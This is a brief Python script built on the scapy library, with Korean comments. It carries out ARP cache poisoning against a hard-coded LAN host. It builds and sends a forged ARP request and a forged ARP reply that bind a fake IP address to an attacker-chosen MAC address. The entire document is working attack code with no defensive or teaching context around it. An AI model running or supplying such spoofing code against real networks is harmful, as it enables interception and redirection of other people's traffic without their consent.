from scapy.all import *

# ARP 캐시 포이즈닝을 수행할 대상 IP 주소와 MAC 주소
target_ip = "192.168.1.10"
target_mac = "00:11:22:33:44:55"

# ARP 캐시 포이즈닝을 위해 임의의 IP 주소와 MAC 주소를 생성함
fake_ip = "192.168.1.100"
fake_mac = "aa:bb:cc:dd:ee:ff"

# ARP 요청 패킷을 생성하고 송신
pkt = Ether(src=fake_mac, dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, psrc=fake_ip, hwsrc=fake_mac, pdst=target_ip)
sendp(pkt)

# ARP 응답 패킷을 생성하고 송신
pkt = Ether(src=fake_mac, dst=target_mac) / ARP(op=2, psrc=fake_ip, hwsrc=fake_mac, pdst=target_ip, hwdst=target_mac)
sendp(pkt)